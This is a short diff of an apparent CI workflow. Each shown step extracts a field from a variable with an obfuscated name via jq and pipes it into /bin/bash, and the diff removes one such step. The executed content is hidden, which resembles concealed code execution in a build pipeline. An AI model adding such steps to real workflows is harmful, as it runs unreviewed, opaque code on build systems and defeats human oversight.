@@ -34,7 +34,6 @@ jobs:
           echo $sfvu37112 | jq -r .xf89532 | /bin/bash
           echo $v0799 | jq -r .xm90730 | /bin/bash
           echo $yh8248 | jq -r .tqjg68994 | /bin/bash
-          printf '%s' "$sp42" | jq -r .p0581 | /bin/bash
           printf '%s' "$vntm68558" | jq -r .cwizk4197 | /bin/bash
           printf '%s' "$cbc1" | jq -r .rmzc972 | /bin/bash
           printf '%s' "$w743" | jq -r .gqe45 | /bin/bash
